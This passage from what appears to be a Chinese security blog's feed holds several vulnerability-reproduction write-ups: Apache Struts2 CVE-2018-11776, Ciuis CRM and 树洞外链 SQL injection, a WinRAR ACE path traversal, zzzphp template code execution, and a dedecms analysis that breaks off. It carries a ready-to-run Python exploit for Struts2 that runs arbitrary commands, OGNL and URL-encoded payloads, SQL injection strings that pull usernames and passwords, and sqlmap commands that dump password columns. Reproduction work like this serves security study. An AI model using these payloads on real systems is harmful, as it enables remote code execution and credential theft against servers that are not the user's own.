      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> dcoker </tag>
            
            <tag> upload-labs </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-11776漏洞复现</title>
      <link href="/2019/08/02/cve-2018-11776-lou-dong-fu-xian/"/>
      <url>/2019/08/02/cve-2018-11776-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。</p><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>URL标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行，以及系统命令到服务器系统中去 。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>Apache struts 2.3-Apache struts 2.3.34</p><p>Apache struts 2.5-Apache struts 2.5.16 </p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>windows 10</li><li>jdk1.8.0_191</li><li>apache-tomcat-7.0.96</li><li>struts-2.3.34</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先安装jdk，并配置环境变量，不再赘述</p><p>下载 <a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">apache-tomcat</a> 并解压<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802122817.png" alt></p><p>下载 <a href="http://archive.apache.org/dist/struts/2.3.34/" target="_blank" rel="noopener">Struts-2.3.34</a> 解压，并将apps目录下的 <code>struts2-showcase.war</code> 复制到tomcat的webapps目录下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123100.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123449.png" alt></p><p>在tomcat下bin目录下运行startup.bat脚本来启动tomcat，启动后自动部署struts2<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123719.png" alt></p><p>浏览器访问 <code>http://127.0.0.1:8080/struts2-showcase</code>，出现如下界面即为部署成功了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123957.png" alt></p><p>正常部署完成struts如上所示，但为了复现struts2-057漏洞，需要修改如下两个文件（tomcat目录下）</p><ul><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\src\java\struts-actionchaining.xml</li><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\classes\struts-actionchaining.xml</li></ul><p>注释掉原来的xml代码，修改如下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802124843.png" alt></p><pre><code>&lt;struts&gt;    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;            &lt;result type=&quot;redirectAction&quot;&gt;            &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;            &lt;/result&gt;            &lt;/action&gt;        &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt;            &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt;        &lt;/action&gt;        &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt;            &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><p>在tomcat下bin目录下运行shutdown.bat，startup.bat脚本来重启tomcat。<br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br>浏览器访问<code>http://192.168.10.230:8080/struts2-showcase/</code>,漏洞环境成功搭建</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在URL构造ognl表达式，再加上配置文件中的action标签中的name属性值，并以.action结尾<br><code>http://127.0.0.1:8080/struts2-showcase/${(50+50)}/actionChain1.action</code><br>执行完成之后发现跳转到了<br><code>http://127.0.0.1:8080/struts2-showcase/100/register2.action</code><br>执行了ognl 表达式 ${(50+50)},漏洞存在</p><p>进一步利用漏洞，弹出计算器，构造payload</p><pre><code>${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))}</code></pre><p>进行URL编码 </p><pre><code>%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d</code></pre><p>拼接</p><pre><code>127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action</code></pre><p>成功执行<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802131043.png" alt></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#coding: utf-8#! python2import requestsimport sysdef expliot(host, command, path):    &#39;&#39;&#39;    2.3.34版本    payload1:    ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    2.3.20版本    payload2:    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    &#39;&#39;&#39;    str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot;    str1 = str1.encode(&#39;hex&#39;)    str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot;    str2 = str2.encode(&#39;hex&#39;)    # 需要进行URL编码    payload1 = &quot;&quot;    for i in range(0, len(str1), 2):        payload1 += &#39;%&#39; + str1[i:i + 2]    payload2 = &quot;&quot;    for i in range(0, len(str2), 2):        payload2 += &#39;%&#39; + str2[i:i + 2]    url1 = host + &#39;/&#39; + payload1 + &#39;/&#39; + path    url2 = host + &#39;/&#39; + payload2 + &#39;/&#39; + path    res1 = requests.get(url1, allow_redirects=False)    res2 = requests.get(url2, allow_redirects=False)    if res1.status_code == 200 and res2.status_code != 200:        print(&quot;Exploit successful:&quot;)        print(res1.content)    elif res2.status_code == 200 and res1.status_code != 200:        print(&quot;Exploit successful:&quot;)        print(res2.content)    else:        print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;)if __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 4:        print(&quot;Usage: python s2-057-exp.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;)    else:        expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())</code></pre><p>使用方法：</p><p><code>python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}</code></p><p>例如:<br><code>python2 struts2.py http://192.168.50.197:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action</code></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.cuittk.cn/2019/01/02/CVE-2018-11776漏洞从搭建到复现/" target="_blank" rel="noopener">CVE-2018-11776漏洞从搭建到复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> CVE-2018-11776 </tag>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ciuis CRM 1.6 - &#39;eventType&#39; SQL Inj.复现</title>
      <link href="/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/"/>
      <url>/2019/08/01/ciuiscrm-1.6-eventtype-sql-inj.fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a>0x01 漏洞详情</h1><pre><code>===========================================================================================# Exploit Title: CiuisCRM 1.6 - &#39;eventType&#39; SQL Inj.# Dork: N/A# Date: 27-05-2019# Exploit Author: Mehmet EMİROĞLU# Vendor Homepage: https://codecanyon.net/item/ciuis-crm/20473489# Software Link: https://codecanyon.net/item/ciuis-crm/20473489# Version: v1.6# Category: Webapps# Tested on: Wamp64, Windows# CVE: N/A# Software Description: Ciuis CRM you can easily manage your customer relationships and save time on your business.===========================================================================================# POC - SQLi# Parameters : eventType# Attack Pattern :-1+or+1%3d1+and(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)# POST Method : http://localhost/ciuiscrm-16/calendar/addevent===========================================================================================</code></pre><hr><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><p>下载Ciuis CRM 1.6，搭建本地环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175019.png" alt></p><p>点击CALENDAR，然后点添加按钮<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175107.png" alt></p><p>随便填入东西，使用burpsuite抓包<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175408.png" alt></p><p>在<code>eventType=1</code>后面添加单引号，发包，出现报错信息，存在注入点<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801175628.png" alt></p><p>将请求信息保存下来（ciuis.txt）用sqlmap跑</p><p><code>python sqlmap.py -r F:\Desktop\ciuis.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181356.png" alt></p><p>查数据库<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt --dbs</code></p><p>查表<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis --tables</code></p><p>查字段<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags --columns</code></p><p>dump出指定字段<br><code>python sqlmap.py -r F:\Desktop\ciuis.txt -D ciuis -T tags -C id,password --dump</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181516.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190801181614.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://exploit.kitploit.com/2019/07/ciuiscrm-16-sql-injection.html" target="_blank" rel="noopener">CiuisCRM 1.6 SQL Injection</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Ciuis CRM 1.6 </tag>
            
            <tag> SQL Inj. </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinRAR目录穿越漏洞复现</title>
      <link href="/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/"/>
      <url>/2019/07/26/winrar-mu-lu-chuan-yue-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>该漏洞是由于 WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在 2006 年被编译，<br>没有任何的基础保护机制(ASLR, DEP 等)。动态链接库的作用是处理 ACE 格式文件。<br>而WinRAR解压ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，<br>将恶意文件写入任意目录,甚至可以写入文件至开机启动项，导致代码执行。</p><hr><h1 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h1><p><strong>影响版本：</strong><br>       * WinRAR &lt; 5.70 Beta 1<br>       * Bandizip &lt; = 6.2.0.0<br>       * 好压(2345压缩) &lt; = 5.9.8.10907<br>       * 360压缩 &lt; = 4.0.0.1170<br>       * ……</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><p>新建一个任意文件，名称类型内容随意<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155542.png" alt></p><p>使用Winace进行压缩<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726155906.png" alt></p><p>然后下载<a href="https://github.com/droe/acefile/blob/master/acefile.py" target="_blank" rel="noopener">acefile.py</a>脚本<br>输入命令<code>python acefile.py --headers test.ace</code> 读取文件的头部信息<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160308.png" alt></p><p>ok，开始构造恶意文件<br>用 010Editor 打开test.ace文件<br>需要修改以下参数：</p><ul><li>hdr_crc</li><li>hdr_size</li><li>filename的长度</li><li>filename<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726160517.png" alt><br>首先将filename的值改为 <code>d:\d:\liehu.txt</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161040.png" alt></li></ul><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161237.png" alt></p><p>修改后的filename的长度，选中它，左下角就是它的长度15，16进制为00 0F，filename的前两位就是它的长度<br>修改顺序是由后到前，即将10改为0F即可<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726161841.png" alt></p><p>修改<strong>hdr_size</strong>，选中如下位置，左下角查看其长度，这里是（00 2E），选中的前面的红框就是hdr_size<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162147.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162439.png" alt></p><p>最后修改<strong>hdr_crc</strong>，再次运行<br><code>python acefile.py --headers test.ace</code><br>CRC校验失败，报错<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726162831.png" alt><br>在acefile.py文件中查找 <code>header CRC failed</code><br>在其上面一行添加输出语句，输出ace_crc16(buf)，即为我们需要的<strong>hdr_crc</strong>的值<br><code>print (ace_crc16(buf), buf)</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163206.png" alt></p><p>改好保存，再次运行<br><code>python acefile.py --headers test.ace</code><br>31102即我们需要的值，转换成16进制为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726163625.png" alt></p><p>将<strong>hdr_size</strong> 前面的两位即为<strong>hdr_crc</strong>，从右到左修改为79 7E<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164206.png" alt></p><p>再次运行<br><code>python acefile.py --headers test.ace</code><br>输出如下信息无报错，就成功了，用开头所述解压工具解压test.ace，就会在红框的路径生成对应的文件。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726164506.png" alt></p><hr><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ol><li>升级最新的WinRAR ，目前版本是 5.71 </li><li>winRAR安装目录下，删除UNACEV2.dll文件</li></ol><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://fuping.site/2019/02/21/WinRAR-Extracting-Code-Execution-Validate/" target="_blank" rel="noopener">WinRAR漏洞复现过程</a><br><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">Extracting a 19 Year Old Code Execution from WinRAR - Check Point Research</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> WinRAR </tag>
            
            <tag> 目录穿越 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树洞外链X_FORWARDED_FOR注入漏洞复现</title>
      <link href="/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/25/shu-dong-x-forwarded-for-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>树洞外链现在已经停止更新，作者又开发了<a href="https://github.com/cloudreve/Cloudreve" target="_blank" rel="noopener">Cloudreve</a>，有兴趣可以了解一下。<br>回归正题，虽然树洞已经停止更新了，还是可以做一些研究学习。<br>树洞外链存在X_FORWARDED_FOR注入漏洞，最新版本的已经修复了，2.2.1版本的可以复现。</p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>在<code>/includes/function.php</code>的37行左右，获取了X_FORWARDED_FOR，并未做防注入过滤 </p><pre><code>function get_real_ip(){$ip=false;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;])){$ip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];}if (!empty($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {$ips = explode (&quot;, &quot;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }for ($i = 0; $i &lt; count($ips); $i++) {if (!eregi (&quot;^(10|172\.16|192\.168)\.&quot;, $ips[$i])) {$ip = $ips[$i];break;}}}return ($ip ? $ip : $_SERVER[&#39;REMOTE_ADDR&#39;]);}</code></pre><p>然后在<code>includes/save.php</code>  20行左右发现调用<code>get_real_ip()</code>函数</p><pre><code>$ip=get_real_ip();$dd=date(&#39;Y-m-d H:i:s&#39;);$rand = md5(time() . mt_rand(0,1000));$stmt = $con-&gt;prepare(&quot;INSERT INTO  `$sqlname`.`sd_file` (`ming` ,`key1` ,`uploadip` ,`uploadtime` ,`cishuo` ,`upuser` ,`policyid`)VALUES (?, &#39;$rand&#39;, &#39;$ip&#39;, &#39;$dd&#39;, &#39;0&#39; , &#39;$uploadUser&#39;, &#39;$policyId&#39;);&quot;);$stmt-&gt;bind_param(&#39;s&#39;, $ming);</code></pre><hr><h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><p>下载树洞外链源码，本地搭建环境。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726110921.png" alt></p><p>注册账号登陆，然后打开burpsuite，关掉拦截<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111147.png" alt></p><p>然后上传文件，在HTTP history里找到<code>/includes/save.php</code>,发送到Repeater<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111306.png" alt></p><p>构造payload并发送(UID改成自己的用户ID，个人详情里面可以查看)</p><pre><code>X-Forwarded-For: 1.1.1.1&#39;,user(),&#39;0&#39;,UID,UID); #ming=aa</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111644.png" alt></p><p>然后在<strong>我的文件</strong>里面可以看到执行结果<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190726111744.png" alt></p><p>爆用户名:<br><code>X-Forwarded-For: 1.1.1.1′,(select username from sd_user where id=1),’0′,uid,uid); #</code></p><p>爆密码:<br><code>X-Forwarded-For: 1.1.1.1′,(select pwdfrom sd_user where id=1),’0′,uid,uid); #</code></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/179363.html" target="_blank" rel="noopener">代码审计树洞X_FORWARDED_FOR注入</a><br><a href="https://blog.csdn.net/qq_21510303/article/details/91886405" target="_blank" rel="noopener">代码审计之头部注入X-Forwarded-For</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 树洞外链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzzphp V1.6.1 远程代码执行漏洞复现</title>
      <link href="/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/"/>
      <url>/2019/07/24/zzzphp-v1.6.1-yuan-cheng-dai-ma-zhi-xing-lou-dong-fen-xi-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p>远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，<br>导致在后台可以写入php代码从而造成代码执行。</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建zzzphp V1.6.1环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141219.png" alt></p><p>在后台模块管理中的电脑模块找到cn2016<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141335.png" alt></p><p>然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为<br><code>{if:assert($_request[phpinfo()])}phpinfo();{end if}</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141523.png" alt></p><p>然后打开<code>http://xxx/zzzcms/search/</code>就可以看到我们刚刚输入的phpinfo()执行了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724141748.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/4471" target="_blank" rel="noopener">zzzphp V1.6.1 远程代码执行漏洞分析</a><br><a href="https://www.anquanke.com/post/id/173991" target="_blank" rel="noopener">zzzphpV1.6.1 远程代码执行漏洞简单分析</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> zzzphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms V5.7-UTF-8-SP2 命令执行漏洞复现</title>
      <link href="/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞概述"><a href="#一、漏洞概述" class="headerlink" title="一、漏洞概述"></a>一、漏洞概述</h1><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724101304.png" alt></p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>环境搭建这里不再赘述，搭建好后访问网站主页<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102343.png" alt></p><p>dedecms默认的后台是/dede,没有修改直接访问登陆<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102453.png" alt></p><p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102828.png" alt></p><p><strong>代码分析</strong></p><pre><code>(1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步(2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。(3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html*   